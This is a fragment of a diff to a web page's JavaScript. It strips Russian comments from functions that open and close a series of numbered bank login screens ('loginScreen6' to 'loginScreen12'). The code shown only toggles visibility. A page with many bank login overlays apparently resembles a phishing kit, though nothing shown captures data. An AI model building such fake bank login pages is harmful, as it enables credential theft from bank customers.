             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 6 =====
         function closeLoginScreen6() {
             const bank6 = document.getElementById('loginScreen6');
             const closeBtn = document.getElementById('bank6CloseBtn');
@@ -5687,7 +5581,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 7 =====
         function openLoginScreen7() {
             const bank7 = document.getElementById('loginScreen7');
             const closeBtn = document.getElementById('bank7CloseBtn');
@@ -5697,7 +5590,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 7 =====
         function closeLoginScreen7() {
             const bank7 = document.getElementById('loginScreen7');
             const closeBtn = document.getElementById('bank7CloseBtn');
@@ -5707,7 +5599,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 8 =====
         function openLoginScreen8() {
             const bank8 = document.getElementById('loginScreen8');
             const closeBtn = document.getElementById('bank8CloseBtn');
@@ -5717,7 +5608,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 8 =====
         function closeLoginScreen8() {
             const bank8 = document.getElementById('loginScreen8');
             const closeBtn = document.getElementById('bank8CloseBtn');
@@ -5727,7 +5617,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 9 =====
         function openLoginScreen9() {
             const bank9 = document.getElementById('loginScreen9');
             const closeBtn = document.getElementById('bank9CloseBtn');
@@ -5737,7 +5626,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 9 =====
         function closeLoginScreen9() {
             const bank9 = document.getElementById('loginScreen9');
             const closeBtn = document.getElementById('bank9CloseBtn');
@@ -5747,7 +5635,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 10 =====
         function openLoginScreen10() {
             const bank10 = document.getElementById('loginScreen10');
             const closeBtn = document.getElementById('bank10CloseBtn');
@@ -5757,7 +5644,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 10 =====
         function closeLoginScreen10() {
             const bank10 = document.getElementById('loginScreen10');
             const closeBtn = document.getElementById('bank10CloseBtn');
@@ -5767,7 +5653,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ОТКРЫТИЕ BANK 12 =====
         function openLoginScreen12() {
             const bank12 = document.getElementById('loginScreen12');
             const closeBtn = document.getElementById('bank12CloseBtn');
@@ -5777,7 +5662,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ BANK 12 =====
         function closeLoginScreen12() {
             const bank12 = document.getElementById('loginScreen12');
             const closeBtn = document.getElementById('bank12CloseBtn');
@@ -5787,7 +5671,7 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== ЗАКРЫТИЕ ПО ESC =====
+        // ===== ESC =====
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') {
                 const bank2 = document.getElementById('loginScreen2');
